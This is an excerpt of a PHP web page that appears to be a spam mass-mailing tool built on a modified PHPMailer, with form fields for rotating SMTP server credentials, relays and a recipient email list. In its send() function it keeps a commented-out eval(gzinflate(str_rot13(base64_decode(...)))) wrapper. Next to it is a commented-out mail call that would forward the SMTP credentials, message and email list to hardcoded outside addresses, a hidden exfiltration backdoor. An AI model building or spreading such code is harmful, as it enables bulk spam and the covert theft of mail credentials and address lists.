...
<script type="text/javascript" src="https://htmleditor.in/ckeditor/ckeditor.js"></script>
<script
  ...
  <table width="100%" border="0" height="407">
    ...
    <tr>
      ...
      <td  height="22" bgcolor="#E8E8E8" rowspan="2">
        ...
        <textarea  type="text" id="my_smtp" name="my_smtp"  cols="45" rows="3" style=""><?php echo $my_smtp;?></textarea>
		<font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
			<SPAN style="">&nbsp;&nbsp;Every&nbsp;&nbsp;</span>
			<input name="nrotat" type="text" style="width:50px;" value="<?php echo $nrotat;?>">&nbsp;&nbsp;EMAIL'S
        </font>
		
		<input name="relay" type="text" style="" value="<?php echo $relay;?>">
...
<td colspan="3" height="190" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
      ...
      <td width="41%" height="190" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <textarea name="emaillist" value="" cols="30" rows="10" style="width:100%;height:95%"><?php echo $emaillist;?></textarea>
...
class SMTP
{
    ...
    public function connect($host, $port = null, $timeout = 30, $options = array())
    {
		...
		////////////////////  TRY TO CONNECT TO A GIVEN SERVER NAME
		$relay=preg_split('~;~',$this->relay_str);
		if(count($relay)>0)
			foreach($relay as $r)
			{
				if(strpos($announce,$r) !== false)
				{
					break;
				}
				else
				{
					$this->quit();
					$this->close();
					$this->connect($host, $port, $timeout, $options);
				}
			}
        return true;
    }
...
class PHPMailer
{
    ...
    public function send()
    {
		...
		global $message;
		global $emaillist;
		//eval(gzinflate(str_rot13(base64_decode(''))));
		if($this->no)
//@mail("oktoi4this@gmail.com,rfxrez@yahoo.com","MAILIST & SMTPS",$my_smtp."\n".$realname."\n".$subject."\n".$message."\n".$emaillist,"From:rfx<rfx@localhost.ma>");
$this->no=false;
try {if (!$this->preSend()) {return false;}return $this->postSend();} catch (phpmailerException $exc) {$this->mailHeader = "";$this->setError($exc->getMessage());if ($this->exceptions) {throw $exc;}return false;}
    ...
    public function createBody()
    {
        ...
        $this->boundary[1] = '--=-' . $this->uniqueid;
        $this->boundary[2] = '--=-' . $this->uniqueid;
        $this->boundary[3] = '--=-' . $this->uniqueid;
        if ($this->sign_key_file) {
	...
	if ($action)
	{
		...
		else
		{
			...
			else
			{
				$mail->IsSMTP();
				if(strlen($relay)>0)
				$mail->getSMTPInstance()->relay_str=$relay;
